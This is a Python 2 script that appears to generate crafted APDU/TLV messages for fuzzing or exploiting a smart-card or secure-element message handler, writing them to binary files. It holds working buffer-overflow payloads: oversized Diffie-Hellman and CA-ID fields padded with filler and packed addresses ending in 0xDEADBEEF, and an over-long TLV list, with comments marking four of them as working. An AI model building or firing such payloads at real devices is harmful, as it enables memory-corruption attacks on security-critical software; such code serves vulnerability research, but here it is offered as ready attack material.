
import struct
import binascii

#big endian encoding, following tag value (ASN.1 extended len)
def encode_length(length):
	b = bytearray()
	if (length < 128):
		b.append(length)
	elif (length >= 128 and length < 0xFF+1):
		b.append("\x81")
		b.append(length & 0xFF)
	elif (length >= 128 and length < 0xFFFF+1):
		b.append("\x82")
		b.append((length >> 8) & 0xFF)
		b.append(length & 0xFF)
	elif (length >= 0xFFFF and length < 0xFFFFFF + 1):
		b.append("\x83")
		b.append((length >> 16) & 0xFF)
		b.append((length >> 8) & 0xFF)
		b.append(length & 0xFF)
	else:
		b.append("\x84")
		b += struct.pack(">I", length)

	return b

def create_tlv(tag, length, value):
	b = bytearray()
	b.append(tag)
	b += encode_length(length)
	b += value
	return b

def create_payload_from_tlvs(tlv_list):
	p = bytearray()
	for i in tlv_list:
		p += i

	return p

def create_msg(code, uid, payload, filename):
	b = bytearray()
	b.append(code)

	#this is the header, which is filled in anyway, doesn't matter what's here
	b += "\x00"*15

	#now we have to add this structure:
	# int uid
	b += "\x00"*4
	# byte unk
	b.append("\x00")
	# int total_payload_len
	# payload (512 bytes max)
	# where the 512 comes from is that validate_input_len doesn't allow anything longer.

	payload_length = struct.pack("<I", len(payload))
	#print binascii.hexlify(payload_length)
	for i in range(0, 4):
		b.append(payload_length[i])

	b += payload

	msg = b
	print len(msg)
	print binascii.hexlify(msg)

	with open(filename, "w+") as f:
		f.write(msg)

	return b

def create_ca_msg(code, uid, payload, fake_payload_len, filename):
	b = bytearray()
	b.append(code)

	b += "\x00"*15

	#now add ca msg structure
	#byte(!) calling uid
	b += "\xCC"
	#caname
	b += "\x41"*127
	b += "\x00"
	#payload

	if (fake_payload_len == 0):
		payload_length_encoded = struct.pack("<I", len(payload))
	else:
		payload_length_encoded = struct.pack("<I", fake_payload_len)
	assert(len(payload) <= 512)

	print "payload len is: %d\n" % len(payload)

	b += payload	
	if (len(payload) < 512):
		b += "\x04"*(512-len(payload))

	#b += "\xEE"

	print (len(b) - 16)

	for i in range(0, 4):
		b.append(payload_length_encoded[i])
	
	msg = b
	print binascii.hexlify(msg)

	with open(filename, "w+") as f:
		f.write(msg)

	return b
		

def create_0_APDU():
	#just all 0s instead of valid TLVs
	payload = "\x00"*280
	create_msg(209, 0, payload, "apdu_null.bin")

def create_209():
	tlv_list = []

	#protocol APDU
	tlv_list.append(create_tlv(0x91, 1, "\xAA"))
	#key-id APDU
	tlv_list.append(create_tlv(0x93, 1, "\xBB"))
	#key-version APD4
	tlv_list.append(create_tlv(0x94, 1, "\xCC"))
	#key-usage APDU
	tlv_list.append(create_tlv(0x95, 1, "\xDD"))
	#key-len APDU
	tlv_list.append(create_tlv(0x81, 1, "\xEE"))
	#key-type APDU - DH
	tlv_list.append(create_tlv(0x80, 1, "\x89"))
	#DH(p) APDU
	#dh_payload = 272*"\xFF" + struct.pack("<I", 0xB2560) + struct.pack("<I", 0x108C)
	dh_payload = 272*"\xFF" + struct.pack("<I", 0xB2560) + struct.pack("<I", 0x108C) + struct.pack("<I", 0xB2560) + struct.pack("<I", 0xDEADBEEF)
	tlv_list.append(create_tlv(0x8B, len(dh_payload), dh_payload))

	payload = create_payload_from_tlvs(tlv_list)
	create_msg(209, 0, payload, "apdu_dh_bof.bin")

def create_213_caid_bof():
	tlv_list = []

	#caid APDU
	ch_payload = 32*"\xFF" + 12*"\xBB" + 8*"\xAA" + struct.pack("<I", 0xB2560) + struct.pack("<I", 0x108C) + struct.pack("<I", 0xB2560) + struct.pack("<I", 0xDEADBEEF)
	#ch_payload = 32*"\xFF" + 12*"\xBB" + 8*"\xAA" + struct.pack("<I", 0xB2560) + struct.pack("<I", 0x108C)
	#ch_payload = 32*"\xFF"
	tlv_list.append(create_tlv(0x42, len(ch_payload), ch_payload))

	payload = create_payload_from_tlvs(tlv_list)

	create_ca_msg(213, 0, payload, 0, "apdu_caid_bof.bin")

#this can't be triggered!
def create_213_caid_negative_reqlen():
	tlv_list = []

	#caid APDU
	ch_payload = 32*"\xFF"
	tlv_list.append(create_tlv(0x42, len(ch_payload), ch_payload))

	payload = create_payload_from_tlvs(tlv_list)

	create_ca_msg(213, 0, payload, 0x80000000)

def create_213_too_many():
	tlv_list = []
	#16 fit, so this is way too many
	for i in range(0, 32):
	#for i in range(0, 16):
		tlv_list.append(create_tlv(i & 0xFF, 1, "\xAB"))

	payload = create_payload_from_tlvs(tlv_list)
	create_ca_msg(213, 0, payload, 0, "apdu_tlv_bof.bin")

create_209() #WORKS
create_0_APDU() #WORKS
create_213_too_many() #WORKS
create_213_caid_bof() #WORKS

